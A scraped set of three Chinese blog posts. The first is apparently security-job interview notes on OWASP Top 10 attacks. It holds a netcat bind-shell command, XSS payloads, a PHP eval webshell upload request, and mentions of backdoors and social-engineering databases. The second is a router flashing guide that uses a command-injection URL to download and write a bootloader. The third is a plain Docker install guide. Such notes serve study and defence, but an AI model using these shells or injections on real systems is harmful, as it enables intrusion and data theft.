[{"content":"大部分为OWASP top 10的相关情况\n反弹shell\nnc -lvvp 7777 -e /bin/bash 一、sql注入 原理 当web应用向后台数据库传递SQL语句进行数据库操作时如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。\n本质：把用户输入的数据当作代码来执行\n分类 1.按输入类型 数值型注入\n字符型注入\n单引号、双引号、带括号\n2.按请求方式 GET POST Cookie HTTP Header user-agent:判定用户使用的操作系统，以及使用的浏览器的版本 cookie:判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡 x-forwarded-for:是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段 client-ip: 数据库保存客户端IP的参数 rerferer:浏览器向web端表明自己从哪个连接而来 host:客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号\n3.按是否回显 显注 报错注入、联合查询、堆叠、宽字节\n盲注 布尔盲注、时间盲注、dnslog盲注\nsqlmap 一些参数\n-D,-T,-C,-currentuser，-current-db，--dump -cookie，-referer，-user-agent 例子\npython3 sqlmap.py -r post.txt -D pikachu -T member -C username,email --dump 绕过方式 大小写\n双写\n编码\n空格\n等价函数\n方式（详细） 例子\n简单联合查询union注入\n布尔注入\n堆叠注入\n时间盲注\n报错注入\nupdatexml()，extractvalue()，floor() ,exp() 宽字节\n二次编码\ndnslog\n预防措施 不信任用户的任何输入，一定一定要对可能引起注入的字符做转义和过滤 白名单方式 限制查询长度和类型 数据库用户的权限配置 限制目录权限 Mysql注入特征 3306，默认不区分大小写，information_schema信息数据库\n二、登录框测试 1、登录成功后生成的Cookie，是否是httponly (否则容易被脚本盗取)\n2、用户名和密码是否通过加密的方式发送给web服务器\n3、用户名和密码的验证，应该是用服务器验证，而不单单是在客户端用javascript验证\n4、用户名和密码的输入框，是否屏蔽SQL注入攻击\n5、用户名和密码的输入框，应该禁止输入脚本（防止XSS攻击）\n6、是否有错误登录的次数限制（防止暴力破解）\n三、文件上传 黑名单绕过 大小写，重写，特殊解析（php3,5,7），加空格，加点绕过，.htaccess\n白名单 %00截断，修改MIME文件类型\n修复 白名单的方式判断文件后缀是否合法。\n重写文件名\n设置不可执行\n四、文件包含 include，require 文件包含 http://192.168.65.135:3366/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/05/21/9097236288ae320dc16631692493.jpg\u0026amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\n待补档，没有太深入学\n五、XSS 原理 XSS的原理是WEB应用程序混淆了用户提交的数据和JS脚本的代码边界，导致浏览器把用户的输入当成了JS代码来执行。\n\u0026lt;script\u0026gt;alert(\u0026#34;xss\u0026#34;)\u0026lt;/script\u0026gt; #\u0026#39; onclick=\u0026#34;alert(\u0026#39;xss\u0026#39;)\u0026#34;\u0026gt; 反射型：用户点击\n存储型：存在服务器，访问即中招\nDOM型：只是前段，特殊反射\n防御 验证，编码，检测和过滤\n对输入(和URL参数)进行过滤，对输出进行转义。\n六、CSRF 原理 攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。常用于盗取账号、转账、发送虚假消息等。攻击者利用网站对请求的验证漏洞而实现这样的攻击行为，网站能够确认请求来源于用户的浏览器，却不能验证请求是否源于用户的真实意愿下的操作行为。\n以下为pikachu靶场的测试用例\n姓名:allen\n性别:boy\n手机:13676767767\n住址:nba 76\n邮箱:allen@pikachu.com\n/vul/csrf/csrfget/csrf_get_edit.php?sex=1\u0026amp;phonenum=1\u0026amp;add=1\u0026amp;email=1\u0026amp;submit=submit 修复 token\n验证Referer\n七、ssrf 原理 SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。\nhttp://192.168.65.135:3366/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/vul/ssrf/1.txt\n修复 禁止302跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。 过滤返回信息，验证远程服务器对请求的返回结果，是否合法。 禁用高危协议，例如：gopher、dict、ftp、file等，只允许http/https。 设置URL白名单或者限制内网IP。 限制请求的端口为http的常用端口，或者根据业务需要开放远程调用服务的端口。 catch错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务。 八、文件上传 \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;198337553110896437781972103010 Content-Disposition: form-data; name=\u0026ldquo;uploadfile\u0026rdquo;; filename=\u0026ldquo;shell.php%00.jpg\u0026rdquo; Content-Type: image/jpg\nGIF89a?\n\u003c?php @eval($_POST['cmd']); ?\u003e 九、渗透测试基本流程和工具 流程 1.明确目标 2.分析风险，获得授权 3.信息收集\nIP、端口识别框架、服务器类型、数据库类型等等\n4.漏洞探测（手动\u0026amp;自动）\nAWVS,Appscan\n5.漏洞验证\n6.信息分析 7.利用漏洞，获取数据\n留后门，擦脚印\n8.信息整理 9.形成报告\n工具 Burp Suite\nNmap\nsqlmap\nAppScan\n御剑\nshell管理工具，蚁剑冰蝎哥斯拉\n在线的whois\n各种搜索引擎\n社工库\n漏扫工具 AWVS、Goby、Appscan\n十、其他的一些杂项 蚁剑冰蝎哥斯拉区别 1. 蚁剑 两次http请求\n第一次 url编码@ini_set(\u0026ldquo;display_errors\u0026rdquo;, \u0026ldquo;0\u0026rdquo;);@set_time_limit(0);\n第二次 列出目录\n0\n2. 冰蝎 两次\n第一次 请求\n第二次 phpinfo\nAES 密码是md5散列值的前16位，MD5 值前 16 位已经在服务端写死了并加入 session\n3. 哥斯拉 三次\n第一次 请求数据建立session\n第二次响应设置session\n第三次 第二次响应一致\n内网渗透工具 cobalt strike\nmsf\nmimikatz\new Earthworm\nfrp\n域渗透 知乎\n将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库\n通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。\n提权、权限维持 脏牛提权 Linux Kernel\u0026gt;=2.6.22的所有linux主机（没打过补丁的）\nsudo提权，glibc提取、suid提权\nms14-058 admin -\u0026gt; system\nms14-068 域电脑 -\u0026gt; 域控主机\n漏洞产生原理：用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。\n查看是否打补丁(KB3011780) systeminfo wmic qfe get hotfixid 攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值，以及用户的suid 应急响应工具 思路\nhttps://blog.csdn.net/qq_53577336/article/details/120676981\n火麒麟：看进程，成员\n360星图，看日志文件\n微步情报分析\n在线沙箱\n病毒查杀\n大全\n漏洞复现 iis，nginx解析漏洞，永恒之蓝\nweblogic，shiro，fastjson，stust2，log4j，jboss\nIIS IIS 6.0—— /xx.asp/xx.jpg\nIIS 7.0—— 默认Fast-cgi开启，直接在图片地址后面输入/.php就会将图片当做php解析\nApache Apache—— 上传文件名为test.php.x1.x2.x3, Apache是从右往左判断\nNginx Nginx——版本小于0.8.37 利用方法和IIS7.0一样\nJBoss WebLogic Shiro反序列化漏洞 shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：\n得到rememberMe的cookie值 \u0026ndash;\u0026gt; Base64解码 \u0026ndash;\u0026gt; AES解密 \u0026ndash;\u0026gt; 反序列化\n然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。\npayload 构造的顺序则就是相对的反着来：\n恶意命令\u0026ndash;\u0026gt;序列化\u0026ndash;\u0026gt;AES加密\u0026ndash;\u0026gt;base64编码\u0026ndash;\u0026gt;发送cookie\n在整个漏洞利用过程中，比较重要的是AES加密的密钥，该秘钥默认是默认硬编码的，所以如果没有修改默认的密钥，就自己可以生成恶意构造的cookie了。\n横向渗透 SMB横向-psexec\u0026amp;smbexec\n流量转发工具 ew Earthworm\nfrp\ncs\n流量分析 wireshark\n科来\nhttp matches \u0026ldquo;(.*?)eval\u0026rdquo;\nip.addr ==101.36.79.67 \u0026amp;\u0026amp; http matches \u0026ldquo;(.*?)acunetix\u0026rdquo;\n溯源 获取IP，上线威胁情报社区分析，ping得到ip，反查域名查whois信息\n历史注册域名\n手机号就丢进社工库\n支付宝转账得姓名\nQQ得到更多信息\nwaf绕过 大小写、特殊字符替换空格和字符、编码绕过\n","permalink":"https://x1a05hen.github.io/posts/learn/offer/","summary":"大部分为OWASP top 10的相关情况 反弹shell nc -lvvp 7777 -e /bin/bash 一、sql注入 原理 当web应用向后台数据库传递SQL语句进行数据库操作时如果对用户","title":"安服面试可能问题整理"},{"content":"一、初始化 首先插网线，初始化一下路由器设置，设置完成后会得到后台链接 192.168.31.1\n二、刷入bread 刷机前请注意：\n关闭电脑上的防火墙以及杀毒软件；\n请全程保持电脑与路由器网线连接，电脑设置为自动获取IP；\n禁止其他不相关的网卡；\n准备一根牙签。\n方法一：（在线刷breed，推荐） 确保红米AC2100路由器官方固件版本为2.0.23，可登录路由器后台查看版本，如果不是请先进行升级或降级；\n确保路由器可正常联网，因为需要在线下载breed；\n获取 stok 值，登录小米路由器后台，在地址栏会看到 stok 的值，如下：\n6acbe0e9eedae4ce0a0f3239282a0083\n将stok值替换下方链接中的\nhttp://192.168.31.1/cgi-bin/luci/;stok=\u0026lt;STOK\u0026gt;/api/misystem/set_config_iotdev?bssid=Xiaomi\u0026amp;user_id=longdike\u0026amp;ssid=%0Acd%20%2Ftmp%0Acurl%20-o%20B%20-O%20https%3A%2F%2Fbreed.hackpascal.net%2Fbreed-mt7621-xiaomi-r3g.bin%20-k%0A%5B%20-z%20%22%24(sha256sum%20B%20%7C%20grep%202e0c6b4ffe8e4a74b7dc9c1f732dab03158dfe4c5f0b30425d9326836b5cec70)%22%20%5D%20%7C%7C%20mtd%20-r%20write%20B%20Bootloader%0A - 路由器会在60秒内重启，灯会从蓝变橘，则代表刷BREED成功。成功后拔掉电源，按住reset同时接上电源等10秒即可进入breed，地址为192.168.1.1。\n三、刷入老毛子Padavan 进入192.168.1.1，点击“固件更新”，固件打勾，在固件处选择Padavan老毛子固件 RM2100_3.4.3.9-099.trx ，点击上传，然后点更新，更新完成后会自动重启。\n等待重启成功后即可进入路由器后台 http://192.168.123.1/ 默认用户名: admin, 默认密码: admin\nWifi 名称分别为：PDCN 和 PDCN_5G 默认密码：1234567890\n","permalink":"https://x1a05hen.github.io/posts/other/redmi/","summary":"一、初始化 首先插网线，初始化一下路由器设置，设置完成后会得到后台链接 192.168.31.1 二、刷入bread 刷机前请注意： 关闭电脑上的防火墙以及杀毒软件； 请全程","title":"RedMi AC2100 刷固件"},{"content":"一、准备工作 卸载旧版本 ​\t旧版本的Docker以docker、docker.io或docker-engine为名。在尝试安装新版本之前，先卸载任何此类旧版本。\nsudo apt-get remove docker docker-engine docker.io containerd runc ​\tapt-get 显示没有包，则证明没有安装过。若以前安装过docker，则还需清除镜像、容器等：\nsudo rm -rf /var/lib/docker sudo rm -rf /var/lib/containerd apt换源 ​\t备份源列表\nsudo cp /etc/apt/sources.list /etc/apt/sources.list.bak ​\t命令行打开sources.list文件\nsudo vim /etc/apt/sources.list ​\t将源文件内容全部注释,并添加以下任意源\n阿里云源\ndeb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse 清华源\ndeb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal universe deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates universe deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security universe deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security multiverse 中科大\ndeb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse 二、安装 1. 设置仓库 ​\t在新主机上首次安装Docker引擎之前，需要设置Docker存储库。之后，可以从存储库安装和更新Docker。\n更新 apt 包索引 sudo apt update 安装 apt 依赖包，用于通过 HTTPS 来获取仓库： sudo apt install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common 添加 Docker 的官方 GPG 密钥： curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - ok\n9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后 8 个字符，验证您现在是否拥有带有指纹的密钥。 sudo apt-key fingerprint 0EBFCD88 pub rsa4096 2017-02-22 [SCEA] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 uid [ unknown] Docker Release (CE deb) \u0026lt;docker@docker.com\u0026gt; sub rsa4096 2017-02-22 [S] 使用以下指令设置官方稳定版仓库(使用阿里云镜像库) sudo add-apt-repository \\ \u0026#34;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \\ $(lsb_release -cs) \\ stable\u0026#34; 2.安装 Docker Engine ​\t更新gpt\nsudo apt update 安装最新版本的 Docker Engine 和 containerd sudo apt install docker-ce docker-ce-cli containerd.io 安装特定版本的 Docker Engine: ​\t列出可用版本\napt-cache madison docker-ce ​\t使用第二列的版本号安装指定版本, 例如：5:20.10.23~3-0~ubuntu-focal\nsudo apt install docker-ce=\u0026lt;VERSION_STRING\u0026gt; docker-ce-cli=\u0026lt;VERSION_STRING\u0026gt; containerd.io ​\t等待安装完成\n3.测试 sudo docker run hello-world ​\t遇到问题\nCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? ​\t输入docker，会显示 \u0026ndash;help，证明docker安装成功，是没有启动\ncd /var/run service docker start ​\t之后再测试，则没有问题\nHello from Docker! This message shows that your installation appears to be working correctly. 三、其他工作 配置非root用户使用docker ​\t以非 root 用户运行 Docker，需要将用户添加到 docker 组\nsudo usermod -aG docker $USER ​\t重启 Docker\nsudo service docker restart ​\t退出当前用户重新登录，再查看\ndocker -v ​\tok\n配置Docker镜像加速 ​\t阿里云容器，生成自己的加速地址\n​\t登录：https://cr.console.aliyun.com/\n​\t点击 “创建我的容器镜像”，在左侧镜像工具下拉栏，找到镜像加速器，即可看到自己专属加速地址。\n​\t可以通过修改daemon配置文件/etc/docker/daemon.json来使用加速器\nsudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json \u0026lt;\u0026lt;-\u0026#39;EOF\u0026#39; { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://*****（此处为自己的地址）\u0026#34;] } EOF # 重启docker sudo service docker restart ### 注意 WSL没有systemctl ，所以只能用service ","permalink":"https://x1a05hen.github.io/posts/tech/docker-install/","summary":"一、准备工作 卸载旧版本 ​ 旧版本的Docker以docker、docker.io或docker-engine为名。在尝试安装新版本之前，先卸载","title":"WSL2 【Ubuntu 20.04 LTS】安装Docker"}]